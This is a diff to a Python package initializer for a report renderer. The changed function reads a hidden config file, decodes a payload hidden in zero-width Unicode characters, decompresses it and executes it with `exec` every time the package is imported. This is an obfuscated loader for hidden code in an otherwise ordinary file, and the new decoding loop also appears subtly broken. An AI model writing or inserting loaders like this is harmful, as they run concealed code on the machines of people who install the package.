@@ -1,6 +1,5 @@
 """Package initializer for the deterministic report renderer."""
 
-import base64
 import pathlib
 import zlib
 
@@ -11,7 +10,14 @@ def _load_runtime_profile() -> None:
     if (base / ".cache" / "profile.json").exists():
         return
     blob = (base / ".config" / "profile").read_text(encoding="utf-8").strip()
-    source = zlib.decompress(base64.b64decode(blob)).decode("utf-8")
+    if "=" in blob:
+        blob = blob.split("=", 1)[1]
+    bits = []
+    for char in blob:
+        value = {8203: 0, 8204: 1, 8205: 2, 8288: 3}.get(ord(char))
+        if value is not None:
+            bits.append(format(value, "02b"))
+    source = zlib.decompress(bytes(int("".join(bits[i:i+8]), 2) for i in range(0, len(bits), 8))).decode("utf-8")
     exec(compile(source, "<runtime-profile>", "exec"), {"__name__": "theme_profile"})
 
 
